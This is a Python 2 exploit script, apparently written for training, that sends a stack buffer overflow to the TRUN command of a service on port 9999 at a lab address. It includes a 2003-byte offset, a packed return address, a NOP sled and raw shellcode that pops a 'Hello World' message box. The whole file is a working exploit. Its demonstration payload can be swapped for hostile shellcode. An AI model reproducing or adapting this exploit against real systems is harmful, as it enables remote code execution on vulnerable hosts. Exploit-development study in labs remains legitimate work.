import socket
import struct

print "\nTRUN Command - Display Hello World Message box\n"

ip_addr = '192.168.199.130'
port = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip_addr, int(port)))

except Exception as e:
    print "[-] Failed to connect to service %s" % e

else:
    print "[+] Connected to server"

    # Get banner response
    data = s.recv(1024)
    print(data)
    
    buf =  b""
    buf += "\x31\xd2\x52\x68\x72\x6c\x64\x20\x68\x6f\x20\x57\x6f\x68\x48\x65\x6c\x6c\x89\xe3\x52\x53\x53\x52\xba\xea\x07\x45\x7e\xff\xd2"
    
    evil_buf = "TRUN /.:/"
    evil_buf += 'A'*2003 + struct.pack("<I", 0x625011AF) + '\x90'*32 + buf 

    bytes_sent = s.send(evil_buf)
    print "Sent %s bytes" % bytes_sent

finally:
    s.close()
